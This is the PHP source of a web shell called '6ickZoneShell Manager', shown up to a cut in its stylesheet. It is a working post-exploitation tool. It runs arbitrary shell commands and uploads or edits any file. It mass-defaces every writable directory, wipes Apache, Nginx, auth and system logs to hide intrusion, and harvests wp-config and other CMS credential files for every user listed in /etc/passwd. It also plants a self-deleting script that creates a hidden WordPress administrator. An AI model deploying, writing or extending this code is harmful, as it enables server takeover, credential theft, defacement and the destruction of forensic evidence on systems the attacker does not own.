<?php
/**
            * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
          **/
error_reporting(0); // Suppress all errors for stealth
session_start(); // Session is now needed again for storing feature outputs
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M'); // Increased memory limit for potential heavier tasks
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();
// --- END ---
//nopass pass version on github.com/priv8/666/webshell.php
// --- CONFIG ---
$title = "6ickZoneShell Manager";
$author = "0x6ick x Nyx6st"; // delete author kau kontol
$theme_bg = "black";
$theme_fg = "#00FFFF"; // Pure Aqua/Cyan
$theme_highlight = "#00FFD1"; // Slightly different shade for highlight
$theme_link = "#00FFFF"; // Pure Aqua/Cyan
$theme_link_hover = "#FFFFFF"; // White on hover
$theme_border_color = "#00FFFF"; // Pure Aqua/Cyan
$theme_table_header_bg = "#191919"; // Dark grey
$theme_table_row_hover = "#333333"; // Darker grey on hover
$theme_input_bg = "black";
$theme_input_fg = "#00FFFF"; // Aqua for input text
$font_family = "'Kelly Slab', cursive";
$message_success_color = "#00CCFF"; // A slightly darker/different aqua for success messages
$message_error_color = "red"; // Red for errors (strong contrast)

// --- FUNCTIONS ---

// Function to sanitize filenames (only prevents directory traversal in filenames)
// This does NOT restrict navigation to parent directories.
function sanitizeFilename($filename) {
    return basename($filename);
}

// Function to execute commands
function exe($cmd) {
    // Attempt to use exec if available, otherwise fallback
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output, $return_var); // Redirect stderr to stdout for full output
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        return $output;
    }
    return "Command execution disabled.";
}

// Function to get file permissions
function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????'; // Return unknown if fileperms fails

    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Function to redirect with messages
function redirect_to_current_path($msg_type = '', $msg_text = '', $current_path = '') {
    global $path;
    $redirect_path = !empty($current_path) ? $current_path : $path;

    header("Location: ?path=" . urlencode($redirect_path) . ($msg_type ? "&msg_type=" . urlencode($msg_type) : "") . ($msg_text ? "&msg_text=" . urlencode($msg_text) : ""));
    exit();
}

// --- INITIAL SETUP & MESSAGE HANDLING ---
// The $path variable directly takes input from $_GET['path'] without strict safePath validation
// allowing full filesystem navigation.
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path); // Normalize slashes for consistency

$msg_type = '';
$msg_text = '';

// Check for messages from previous redirects and trigger a clean redirect
if (isset($_GET['msg_type']) && isset($_GET['msg_text'])) {
    $msg_type = htmlspecialchars($_GET['msg_type']);
    $msg_text = htmlspecialchars($_GET['msg_text']);
    
    $current_url_base = strtok($_SERVER["REQUEST_URI"], '?');
    $query_params = $_GET;
    unset($query_params['msg_type']);
    unset($query_params['msg_text']);
    $new_query_string = http_build_query($query_params);
    header("Location: {$current_url_base}?" . $new_query_string);
    exit();
}

// --- HANDLERS FOR ACTIONS ---

// Upload File
if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']); // Use sanitizeFilename to prevent path traversal in filename
    if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)){
        redirect_to_current_path('success', 'UPLOAD SUCCES: ' . $file_name, $path);
    }else{
        redirect_to_current_path('error', 'File Gagal Diupload !!', $path);
    }
}

// Mass Deface
$mass_deface_results = ''; // Initialize for display later
if(isset($_POST['start_mass_deface'])) {
    $d_dir = $_POST['d_dir']; // Direct path for mass deface directory
    $d_file = sanitizeFilename($_POST['d_file']); // Sanitize filename
    $script_content = $_POST['script_content'];

    // Convert $d_dir to realpath to use as a concrete base for safety check
    $mass_deface_base_dir = realpath($d_dir); 
    if ($mass_deface_base_dir === false) { // Handle invalid path
        $_SESSION['feature_output'] = "<font color=red>Error: Direktori Mass Deface tidak valid atau tidak dapat diakses.</font>";
        redirect_to_current_path('error', 'Mass Deface Gagal.', $path);
    }

    $script_root_dir = realpath(dirname(__FILE__));

    function sabun_massal_recursive($dir_current, $namafile, $isi_script, &$results_arr, $allowed_base_dir_for_deface) { // Renamed param
        if(is_writable($dir_current)) {
            $dira = @scandir($dir_current);
            if ($dira === false) return;
            foreach($dira as $dirb) {
                if ($dirb === '.' || $dirb === '..') continue;
                $dirc = "$dir_current/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                // Modified Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
                if (strpos(realpath($dirc), $allowed_base_dir_for_deface) !== 0) { // Check if subdirectory is outside the allowed base
                    $results_arr .= "[<font color=red>SKIPPED</font>] " . htmlspecialchars($dirc) . " (outside target base path for mass deface)<br>";
                    continue;
                }
                if(is_dir($dirc)) {
                    if(is_writable($dirc)) {
                        $results_arr .= "[<font color=lime>DONE</font>] " . htmlspecialchars($lokasi) . "<br>";
                        file_put_contents($lokasi, $isi_script);
                        sabun_massal_recursive($dirc,$namafile,$isi_script,$results_arr, $allowed_base_dir_for_deface); 
                    } else {
                         $results_arr .= "[<font color=red>FAILED</font>] " . htmlspecialchars($dirc) . " (not writable)<br>";
                    }
                }
            }
        } else {
            $results_arr .= "[<font color=red>FAILED</font>] " . htmlspecialchars($dir_current) . " (not writable)<br>";
        }
    }

    function sabun_biasa_non_recursive($dir_current, $namafile, $isi_script, &$results_arr, $allowed_base_dir_for_deface) { // Renamed param
        if(is_writable($dir_current)) {
            $dira = @scandir($dir_current);
             if ($dira === false) return;
            foreach($dira as $dirb) {
                if ($dirb === '.' || $dirb === '..') continue;
                $dirc = "$dir_current/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                // Modified Safety check: Ensure operation is within the user-specified $allowed_base_dir_for_deface
                 if (strpos(realpath($dirc), $allowed_base_dir_for_deface) !== 0) { // Check if subdirectory is outside the allowed base
                    $results_arr .= "[<font color=red>SKIPPED</font>] " . htmlspecialchars($dirc) . " (outside target base path for mass deface)<br>";
                    continue;
                }
                if(is_dir($dirc)) {
                    if(is_writable($dirc)) {
                        $results_arr .= "[<font color=lime>DONE</font>] " . htmlspecialchars($dirc . '/' . $namafile) . "<br>";
                        file_put_contents($lokasi, $isi_script);
                    } else {
                         $results_arr .= "[<font color=red>FAILED</font>] " . htmlspecialchars($dirc) . " (not writable)<br>";
                    }
                }
            }
        } else {
            $results_arr .= "[<font color=red>FAILED</font>] " . htmlspecialchars($dir_current) . " (not writable)<br>";
        }
    }
    
    if($_POST['tipe_sabun'] == 'mahal') {
        $mass_deface_results = "<div style='margin: 5px auto; padding: 5px'>";
        sabun_massal_recursive($d_dir, $d_file, $script_content, $mass_deface_results, $mass_deface_base_dir); // Pass new param
        $mass_deface_results .= "</div>";
    } elseif($_POST['tipe_sabun'] == 'murah') {
        $mass_deface_results = "<div style='margin: 5px auto; padding: 5px'>";
        sabun_biasa_non_recursive($d_dir, $d_file, $script_content, $mass_deface_results, $mass_deface_base_dir); // Pass new param
        $mass_deface_results .= "</div>";
    }
}

// Command execution
$cmd_output = '';
if(isset($_POST['do_cmd'])){
    $cmd_output = exe($_POST['cmd_input']);
}

if(isset($_GET['option']) && isset($_POST['path_target']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target']; // Direct path for operations
    $action = $_POST['opt_action'];
    $current_dir_for_redirect = isset($_GET['path']) ? $_GET['path'] : getcwd();

    switch ($action) {
        // DELETE action handler removed from here
        case 'chmod_save':
            if(isset($_POST['perm_value']) && file_exists($target_full_path)){
                $perm = octdec($_POST['perm_value']);
                if(chmod($target_full_path,$perm)){
                    redirect_to_current_path('success', 'CHANGE PERMISSION SUCCESS !!', $current_dir_for_redirect);
                } else {
                    redirect_to_current_path('error', 'Change Permission Gagal !!', $current_dir_for_redirect);
                }
            } else {
                 redirect_to_current_path('error', 'Target atau izin tidak valid!', $current_dir_for_redirect);
            }
            break;
        case 'rename_save':
            if(isset($_POST['new_name_value']) && file_exists($target_full_path)){
                $new_name_base = sanitizeFilename($_POST['new_name_value']); // Sanitize new filename
                $new_full_path = dirname($target_full_path).'/'.$new_name_base;
                if(rename($target_full_path, $new_full_path)){
                    redirect_to_current_path('success', 'CHANGE NAME SUCCESS !!: ' . $new_name_base, $current_dir_for_redirect);
                } else {
                    redirect_to_current_path('error', 'Change Name Gagal !!', $current_dir_for_redirect);
                }
            } else {
                redirect_to_current_path('error', 'Target atau nama baru tidak valid!', $current_dir_for_redirect);
            }
            break;
        case 'edit_save':
            if(isset($_POST['src_content']) && file_exists($target_full_path)){
                if(is_writable($target_full_path)) {
                    if(file_put_contents($target_full_path,$_POST['src_content'])){
                        redirect_to_current_path('success', 'EDIT FILE SUCCESS !!', $current_dir_for_redirect);
                    } else {
                        redirect_to_current_path('error', 'Edit File Gagal !!', $current_dir_for_redirect);
                    }
                } else {
                     redirect_to_current_path('error', 'File tidak writable!', $current_dir_for_redirect);
                }
            } else {
                 redirect_to_current_path('error', 'Target atau konten tidak valid!', $current_dir_for_redirect);
            }
            break;
    }
}
if(isset($_GET['create_new']) && isset($_POST['create_type']) && isset($_POST['create_name'])) {
    $create_type = $_POST['create_type'];
    $create_name = sanitizeFilename($_POST['create_name']); // Sanitize filename
    $target_path_new = $path . '/' . $create_name;

    if ($create_type == 'file') {
        if (file_put_contents($target_path_new, '') !== false) {
            redirect_to_current_path('success', 'File Baru Berhasil Dibuat: ' . $create_name, $path);
        } else {
            redirect_to_current_path('error', 'Gagal membuat file baru!', $path);
        }
    } elseif ($create_type == 'dir') {
        if (mkdir($target_path_new)) {
            redirect_to_current_path('success', 'Folder Baru Berhasil Dibuat: ' . $create_name, $path);
        } else {
            redirect_to_current_path('error', 'Gagal membuat folder baru!', $path);
        }
    }
}

// SQL Client
if(isset($_POST['sql_client_submit'])) {
    $db_host = $_POST['db_host'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_name = $_POST['db_name'];
    $sql_query = $_POST['sql_query'];
    
    $sql_output = '';
    $conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name);

    if (!$conn) {
        $sql_output = "Koneksi Gagal: " . mysqli_connect_error();
    } else {
        $query_result = @mysqli_query($conn, $sql_query);
        if ($query_result === false) {
            $sql_output = "Query Gagal: " . mysqli_error($conn);
        } else {
            if (is_object($query_result) && method_exists($query_result, 'fetch_assoc')) { // Check if it's a SELECT query result
                $sql_output .= "<table class='sql-result-table'>";
                $sql_output .= "<thead><tr>";
                $header_printed = false;
                $first_row = mysqli_fetch_assoc($query_result);
                if ($first_row) {
                    foreach ($first_row as $key => $value) {
                        $sql_output .= "<th>" . htmlspecialchars($key) . "</th>";
                    }
                    $sql_output .= "</tr></thead><tbody>";
                    $header_printed = true;
                    // Output the first row
                    $sql_output .= "<tr>";
                    foreach ($first_row as $value) {
                        $sql_output .= "<td>" . htmlspecialchars($value) . "</td>";
                    }
                    $sql_output .= "</tr>";
                }
                while ($row = mysqli_fetch_assoc($query_result)) {
                    $sql_output .= "<tr>";
                    foreach ($row as $value) {
                        $sql_output .= "<td>" . htmlspecialchars($value) . "</td>";
                    }
                    $sql_output .= "</tr>";
                }
                if (!$header_printed) { // If no rows were returned at all
                     $sql_output .= "<thead><tr><th>Query executed successfully but returned no rows.</th></tr></thead><tbody><tr><td>Affected rows: " . mysqli_affected_rows($conn) . "</td></tr></tbody>"; // Show affected rows even for SELECT if no rows.
                }
                $sql_output .= "</tbody></table>";
            } else { // Non-SELECT query (INSERT, UPDATE, DELETE, etc.)
                $sql_output = "Query Berhasil Dieksekusi. " . mysqli_affected_rows($conn) . " baris terpengaruh.";
            }
            // Only free result if it's an object (i.e., from SELECT queries)
            if (is_object($query_result)) {
                mysqli_free_result($query_result);
            }
        }
        mysqli_close($conn);
    }
    $_SESSION['feature_output'] = $sql_output;
    redirect_to_current_path('success', 'SQL Client Selesai.', $path);
}

// Log Cleaner
if(isset($_POST['clean_logs_submit'])) {
    $log_paths = [];
    $log_results = "";
    
    // Common Linux Log Paths
    $log_paths['/var/log/apache2/access.log'] = 'Apache Access Log';
    $log_paths['/var/log/apache2/error.log'] = 'Apache Error Log';
    $log_paths['/var/log/nginx/access.log'] = 'Nginx Access Log';
    $log_paths['/var/log/nginx/error.log'] = 'Nginx Error Log';
    $log_paths['/var/log/auth.log'] = 'Authentication Log';
    $log_paths['/var/log/syslog'] = 'System Log';
    $log_paths['/var/log/messages'] = 'Messages Log';
    $log_paths['/var/log/mysql/mysql.log'] = 'MySQL General Log';
    $log_paths['/var/log/mysql/error.log'] = 'MySQL Error Log';
    $log_paths['/var/log/maillog'] = 'Mail Log';
    $log_paths['/var/log/secure'] = 'Secure Log (RHEL/CentOS)';
    
    foreach ($log_paths as $path_to_clean => $log_name) {
        if (file_exists($path_to_clean) && is_writable($path_to_clean)) {
            if (file_put_contents($path_to_clean, '') !== false) {
                $log_results .= htmlspecialchars("[$log_name] ($path_to_clean) -> BERSIH!<br>");
            } else {
                $log_results .= htmlspecialchars("[$log_name] ($path_to_clean) -> GAGAL DIBERSIHKAN (Izin/Masalah Tulis)<br>");
            }
        } elseif (file_exists($path_to_clean) && !is_writable($path_to_clean)) {
            $log_results .= htmlspecialchars("[$log_name] ($path_to_clean) -> TIDAK DAPAT DITULIS (Izin)<br>");
        } else {
            $log_results .= htmlspecialchars("[$log_name] ($path_to_clean) -> TIDAK DITEMUKAN<br>");
        }
    }
    $_SESSION['feature_output'] = $log_results;
    redirect_to_current_path('success', 'Log Cleaner Selesai.', $path);
}

// Encode/Decode
if(isset($_POST['encode_decode_submit'])) {
    $text_input = $_POST['encode_decode_text'];
    $action_type = $_POST['encode_decode_action'];
    $result_output = '';
    
    switch($action_type) {
        case 'base64_encode': $result_output = base64_encode($text_input); break;
        case 'base64_decode': $result_output = base64_decode($text_input); break;
        case 'url_encode':    $result_output = urlencode($text_input); break;
        case 'url_decode':    $result_output = urldecode($text_input); break;
        case 'md5':           $result_output = md5($text_input); break;
        case 'sha1':          $result_output = sha1($text_input); break;
        case 'str_reverse':   $result_output = strrev($text_input); break;
        default: $result_output = "Invalid action.";
    }
    $_SESSION['feature_output'] = htmlspecialchars($result_output); // Use a single session variable for general feature output
    redirect_to_current_path('success', 'Encode/Decode Selesai.', $path);
}

// Config Grabber
if(isset($_POST['start_config_grab'])){
    if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
        $_SESSION['feature_output'] = "Tidak bisa di gunakan di server windows";
    } else {
        $etc_passwd_content = @file_get_contents("/etc/passwd");
        if ($etc_passwd_content === false) {
            $_SESSION['feature_output'] = "<font color=red>Gagal membaca /etc/passwd. Periksa izin.</font>";
        } else {
            $grab_config_output_temp = "";
            @mkdir("6ickZone_grabbed", 0777); // Changed directory name
            @chdir("6ickZone_grabbed");
            
            preg_match_all('/(.*?):x:/', $etc_passwd_content, $user_config);
            foreach($user_config[1] as $user_name_found) { // Changed var name from $user_sanrei
                $grab_config_paths = array(
                    "/home/$user_name_found/.accesshash" => "WHM-accesshash",
                    "/home/$user_name_found/public_html/wp-config.php" => "Wordpress",
                    "/home/$user_name_found/public_html/configuration.php" => "Joomla",
                    "/home/$user_name_found/public_html/config/koneksi.php" => "Lokomedia",
                    "/home/$user_name_found/public_html/forum/config.php" => "phpBB",
                    "/home/$user_name_found/public_html/sites/default/settings.php" => "Drupal",
                    "/home/$user_name_found/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home/$user_name_found/public_html/app/etc/local.xml" => "Magento",
                    "/home/$user_name_found/public_html/admin/config.php" => "OpenCart",
                    "/home/$user_name_found/public_html/application/config/database.php" => "Ellislab",
                    "/home/$user_name_found/public_html/vb/includes/config.php" => "Vbulletin",
                    "/home/$user_name_found/public_html/includes/config.php" => "Vbulletin",
                );  
                foreach($grab_config_paths as $config_path_abs => $config_type_name) {
                    $ambil_config = @file_get_contents($config_path_abs);
                    if($ambil_config != '') {
                        $grab_config_output_temp .= htmlspecialchars("$config_path_abs -> FOUND ($config_type_name)<br>");
                        @file_put_contents("$user_name_found-$config_type_name.txt", $ambil_config);
                    }
                }
            }
            if (empty($grab_config_output_temp)) {
                $grab_config_output_temp = "<font color=red>Tidak ada konfigurasi yang ditemukan.</font>";
            } else {
                $grab_config_output_temp .= "<br><font color=lime>Konfigurasi disimpan di folder '6ickZone_grabbed' di direktori shell.</font>";
            }
            @chdir($path); // Return to original directory
            $_SESSION['feature_output'] = $grab_config_output_temp;
        }
    }
    redirect_to_current_path('success', 'Config Grabber Selesai.', $path);
}

// Auto Create WordPress Admin
if(isset($_POST['wp_admin_submit'])) {
    $wp_root_path = $_POST['wp_root_path']; // Get WordPress root path
    $wp_username = sanitizeFilename($_POST['wp_username']);
    $wp_password = $_POST['wp_password'];
    $wp_email = $_POST['wp_email'];

    $admin_script_name = "0x6ick_wp_admin_" . uniqid() . ".php"; // Changed filename
    $admin_script_path = $wp_root_path . '/' . $admin_script_name;

    $admin_code = "<?php
    define('WP_USE_THEMES', false);
    require('" . addslashes($wp_root_path) . "/wp-load.php'); // Ensure path is escaped for string literal

    \$user_id = wp_insert_user(array(
        'user_login'    => '" . addslashes($wp_username) . "',
        'user_pass'     => '" . addslashes($wp_password) . "',
        'user_email'    => '" . addslashes($wp_email) . "',
        'role'          => 'administrator'
    ));

    if (!is_wp_error(\$user_id)) {
        echo 'Administrator WordPress ' . \$user_id . ' (' . \"" . addslashes($wp_username) . "\" ) berhasil dibuat.';
    } else {
        echo 'Gagal membuat administrator WordPress: ' . \$user_id->get_error_message();
    }
    
    // Attempt to delete self
    unlink(__FILE__);
    ?>";

    if (file_put_contents($admin_script_path, $admin_code) !== false) {
        // Execute the script by accessing its URL using cURL for robustness
        $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
        $host = $_SERVER['HTTP_HOST'];
        
        // Construct the URL to the temporary WP admin creation script
        $clean_wp_root_path = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($wp_root_path));
        $temp_script_url = "{$scheme}://{$host}" . $clean_wp_root_path . "/{$admin_script_name}";
        $temp_script_url = str_replace('//','/',$temp_script_url); // Fix double slashes

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $temp_script_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects if any
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Max 10 seconds to execute script
        $result = curl_exec($ch);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($curl_error) {
            $_SESSION['feature_output'] = "cURL Error executing WP Admin script: " . htmlspecialchars($curl_error);
        } else {
            $_SESSION['feature_output'] = htmlspecialchars($result);
        }
        
        // Try to delete the script right after execution
        if (file_exists($admin_script_path)) {
            unlink($admin_script_path); // Attempt immediate delete
        }
        redirect_to_current_path('success', 'Proses Buat Admin WordPress Selesai. Cek output.', $path);
    } else {
        redirect_to_current_path('error', 'Gagal membuat file script admin di ' . htmlspecialchars($wp_root_path) . '. Periksa izin tulis.', $path);
    }
}

// Ping Tool
if(isset($_POST['ping_submit'])) {
    $target_host = $_POST['ping_target'];
    $ping_count = intval($_POST['ping_count']);
    if ($ping_count <= 0 || $ping_count > 10) $ping_count = 4; // Default to 4 pings
    
    $ping_cmd = "ping -c {$ping_count} " . escapeshellarg($target_host); // Use escapeshellarg for safety
    $ping_output = exe($ping_cmd);
    
    $_SESSION['feature_output'] = htmlspecialchars($ping_output);
    redirect_to_current_path('success', 'Ping Selesai.', $path);
}

// Port Scanner
if(isset($_POST['portscan_submit'])) {
    $target_host = $_POST['portscan_target'];
    $ports_to_scan = $_POST['ports_to_scan']; // e.g., "80,443,21-23"
    
    $scan_output = "";
    // Prioritize nmap if available, otherwise netcat
    if (function_exists('exec') || function_exists('shell_exec')) { // Check if command execution is generally enabled
        if (trim(exe('which nmap')) !== '') { // Check if nmap is installed
            $scan_cmd = "nmap -p " . escapeshellarg($ports_to_scan) . " " . escapeshellarg($target_host);
            $scan_output = exe($scan_cmd);
        } elseif (trim(exe('which nc')) !== '') { // Check if netcat is installed
            $ports_array = explode(',', $ports_to_scan);
            foreach ($ports_array as $port_range) {
                if (strpos($port_range, '-') !== false) { // Handle port ranges
                    list($start_port, $end_port) = explode('-', $port_range);
                    for ($p = (int)$start_port; $p <= (int)$end_port; $p++) {
                        $nc_cmd = "nc -zvn " . escapeshellarg($target_host) . " " . escapeshellarg($p) . " 2>&1";
                        $scan_output .= exe($nc_cmd) . "\n";
                    }
                } else { // Handle single ports
                    $nc_cmd = "nc -zvn " . escapeshellarg($target_host) . " " . escapeshellarg($port_range) . " 2>&1";
                    $scan_output .= exe($nc_cmd) . "\n";
                }
            }
            $scan_output = "Nmap not found, using Netcat. Output might be verbose:\n" . $scan_output;
        } else {
            $scan_output = "Error: Nmap or Netcat not found on server.";
        }
    } else {
        $scan_output = "Error: Command execution functions are disabled.";
    }

    $_SESSION['feature_output'] = htmlspecialchars($scan_output);
    redirect_to_current_path('success', 'Port Scan Selesai.', $path);
}

// DNS Lookup
if(isset($_POST['dns_lookup_submit'])) {
    $target_domain = $_POST['dns_lookup_target'];
    $record_type = $_POST['dns_record_type']; // e.g., A, MX, NS
    
    $dns_output = "";
    if (trim(exe('which dig')) !== '') { // Prioritize dig
        $dns_cmd = "dig " . escapeshellarg($target_domain) . " " . escapeshellarg($record_type);
        $dns_output = exe($dns_cmd);
    } elseif (trim(exe('which nslookup')) !== '') { // Fallback to nslookup
        $dns_cmd = "nslookup -type=" . escapeshellarg($record_type) . " " . escapeshellarg($target_domain);
        $dns_output = exe($dns_cmd);
    } else {
        $dns_output = "Error: dig or nslookup not found on server.";
    }
    
    $_SESSION['feature_output'] = htmlspecialchars($dns_output);
    redirect_to_current_path('success', 'DNS Lookup Selesai.', $path);
}

// Whois Lookup
if(isset($_POST['whois_submit'])) {
    $target_domain = $_POST['whois_target'];
    
    $whois_output = "";
    if (trim(exe('which whois')) !== '') {
        $whois_cmd = "whois " . escapeshellarg($target_domain);
        $whois_output = exe($whois_cmd);
    } else {
        $whois_output = "Error: whois command not found on server.";
    }
    
    $_SESSION['feature_output'] = htmlspecialchars($whois_output);
    redirect_to_current_path('success', 'Whois Lookup Selesai.', $path);
}

?>

<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo $title; ?></title>
<style type="text/css">
body {
    font-family: 'Kelly Slab', cursive;
    background-color: <?php echo $theme_bg; ?>;
    color: <?php echo $theme_fg; ?>;
    margin: 0;
    padding: 0;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
center {
    width: 100%;
    margin: 0 auto;
}
table {
    border-collapse: collapse;
    padding: 5px;
    color: <?php echo $theme_fg; ?>;
    width: 95%;
    max-width: 900px;
    margin: 0 auto;
}
.table_home, .th_home, .td_home {
    color: <?php echo $theme_fg; ?>;
    border: 2px solid <?php echo $theme_table_row_hover; ?>;
    padding: 7px;
}
#content tr:hover {
    background-color: <?php echo $theme_table_row_hover; ?>;
    text-shadow: 0px 0px 10px #000000;
}
#content .first {
    color: #000000;
    background-color: <?php echo $theme_table_header_bg; ?>;
    text-shadow: none;
}
#content .first:hover {
    background-color: <?php echo $theme_table_header_bg; ?>;
    text-shadow: 0px 0px 1px #339900;
}
a {
    font-size: 19px;
    color: <?php echo $theme_link; ?>;
    text-decoration: none;
    transition: color 0.3s ease, text-shadow 0.3s ease;
}
a:hover {
    color: <?php echo $theme_link_hover; ?>;
    text-shadow: 0px 0px 10px #339900;
}
input, select, textarea {
    border: 1px <?php echo $theme_link_hover; ?> solid;
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    background: <?php echo $theme_input_bg; ?>;
    color: <?php echo $theme_input_fg; ?>;
    font-family: 'Kelly Slab', cursive;
    padding: 5px;
    box-sizing: border-box;
}
input[type="submit"] {
    background: <?php echo $theme_input_bg; ?>;
    color: <?php echo $theme_fg; ?>;
    border: 2px solid <?php echo $theme_fg; ?>;
    cursor: pointer;
    font-weight: bold;
    transition: background 0.3s ease, color 0.3s ease;
}
input[type="submit"]:hover {
    background: <?php echo $theme_fg; ?>;
    color: <?php echo $theme_input_bg; ?>;
}
h1 {
    font-family: 'Kelly Slab', cursive;
    font-size: 35px;
    color: white;
    margin: 20px 0 10px;
}
.system-info-table td {
    border: none;
    padding: 2px 5px;
    text-align: left;
}
.path-nav {
    margin: 10px auto;
    width: 95%;
    max-width: 900px;
    text-align: left;
    word-wrap: break-word;
    color: <?php echo $theme_fg; ?>;
    padding-left: 5px;
}
.path-nav a {
    font-size: 1em;
    font-weight: bold;
    color: <?php echo $theme_link; ?>;
}
.message {
    padding: 10px;
    margin: 10px auto;
    border-radius: 5px;
    width: 90%;
    max-width: 800px;
    font-weight: bold;
    text-align: center;
}
.message.success {
    background-color: <?php echo $message_success_color; ?>;
    color: <?php echo $theme_bg; ?>;
}
.message.error {
    background-color: <?php echo $message_error_color; ?>;
    color: white;
}
.feature-output-box {
    background-color: #1a1a1a;
    border: 1px solid <?php echo $theme_border_color; ?>;
    padding: 15px;
    margin: 20px auto;
    border-radius: 8px;
    width: 95%;
    max-width: 880px;
    box-sizing: border-box;
    text-align: left;
}
.feature-output-box h4 {
    color: <?php echo $theme_highlight; ?>;
    margin-top: 0;
    margin-bottom: 10px;
    border-bottom: 1px solid <?php echo $theme_border_color; ?>;
    padding-bottom: 5px;
}
.feature-output-box .clear-btn {
    float: right;
    background: none;
    border: 1px solid <?php echo $theme_link; ?>;
    color: <?php echo $theme_link; ?>;
    padding: 5px 10px;
    border-radius: 5px;
    cursor: pointer;
    text-decoration: none;
    font-size: 0.8em;
    transition: background 0.3s ease, color 0.3s ease;
}
.feature-output-box .clear-btn:hover {
    background: <?php echo $theme_link; ?>;
    color: <?php echo $theme_input_bg; ?>;
}
pre {
    background-color: #1a1a1a;
    border: 1px solid <?php echo $theme_border_color; ?>;
    padding: 10px;
    overflow-x: auto;
    white-space: pre-wrap;
    word-wrap: break-word;
    margin: 10px auto; /* Changed from 10px auto to fit inside section-box */
    color: <?php echo $theme_input_fg; ?>;
    width: 95%; /* Adjusted width */
    max-width: 880px; /* Adjusted max-width */
    text-align: left;
}
h3 {
    font-size: 22px;
    color: <?php echo $theme_link; ?>;
    text-align: center;
    margin-top: 20px;
    margin-bottom: 15px;
}
.section-box {
    background-color: #1a1a1a;
    border: 1px solid <?php echo $theme_border_color; ?>;
    padding: 15px;
    margin: 20px auto;
    border-radius: 8px;
    width: 95%;
    max-width: 880px;
    box-sizing: border-box;
}
.section-box form {
    margin-bottom: 0;
}
.main-menu {
    margin: 20px auto;
    width: 95%;
    max-width: 900px;
    text-align: center;
    padding: 10px 0;
    border-top: 1px solid <?php echo $theme_border_color; ?>;
    border-bottom: 1px solid <?php echo $theme_border_color; ?>;
}
.main-menu a {
    margin: 0 10px;
    font-size: 1.1em;
    white-space: nowrap;
}
.sql-result-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
    color: <?php echo $theme_fg; ?>;
    font-size: 0.9em;
}
.sql-result-table th, .sql-result-table td {
    border: 1px solid <?php echo $theme_border_color; ?>;
    padding: 8px;
    text-align: left;
    word-wrap: break-word;
}
.sql-result-table th {
    background-color: <?php echo $theme_table_header_bg; ?>;
    color: <?php echo $theme_highlight; ?>;
}
.sql-result-table tr:nth-child(even) {
    background-color: #0d0d0d;
}
.sql-result-table tr:hover {
    background-color: <?php echo $theme_table_row_hover; ?>;
}
.file-actions select, .file-actions input[type="submit"] {
    width: auto !important;
    font-size: 15px !important;
    height: auto !important;
    padding: 4px 8px !important;
    margin: 0 2px !important;
    display: inline-block;
    vertical-align: middle;
}
.file-actions input[type="submit"] {
    width: 30px !important;
}
.create-form input[type="text"], .create-form select {
    width: 200px;
    height: 30px;
    margin-bottom: 10px;
}
.create-form input[type="submit"] {
    width: 100px;
    height: 30px;
}

/* Responsive adjustments */
@media (max-width: 768px) {
    h1 { font-size: 28px; }
    .system-info-table, .path-nav, table, .section-box, .main-menu, .feature-output-box {
        width: 98%;
        padding: 5px;
        margin: 5px auto;
    }
    table th, table td, .td_home {
        padding: 4px;
        font-size: 0.8em;
    }
    .path-nav a {
        font-size: 0.9em;
